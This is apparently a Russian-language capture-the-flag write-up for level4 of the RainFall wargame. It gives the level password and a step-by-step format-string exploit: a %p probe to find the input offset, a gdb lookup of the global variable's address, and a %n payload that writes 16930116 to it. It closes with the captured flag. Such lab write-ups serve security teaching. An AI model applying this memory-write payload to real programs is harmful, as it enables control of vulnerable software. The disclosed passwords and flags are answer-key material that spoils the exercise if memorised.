1. Логинимся level4:b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
2. Инвестигируем. Программа как и предыдущие тупо нас копирует. Задание такое же как и предыдущие, только число в глобальной переменной большое
3. 3. Узнаем куда вводится наш буффер, который подаётся в printf. Для этого введём:

level4@RainFall:~$ python -c "print 'AAAA' + ' %p' * 20" | ./level4
AAAA 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025

Получаем что с 12ого номера мы читаем наш ввод

4. Узнаем адрес нашей переменной
(gdb) info variables
All defined variables:

Non-debugging symbols:
...
0x08049810  m
в это место нужно вписать число 16930116

4. Готовим payload
адрес переменной + (16930116 - 4(адрес переменной)) символов + %n на 12ом месте

python -c "print '\x10\x98\x04\x08' + '%16930112d%12$n'" | ./level4
Получаем в конце флаг
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a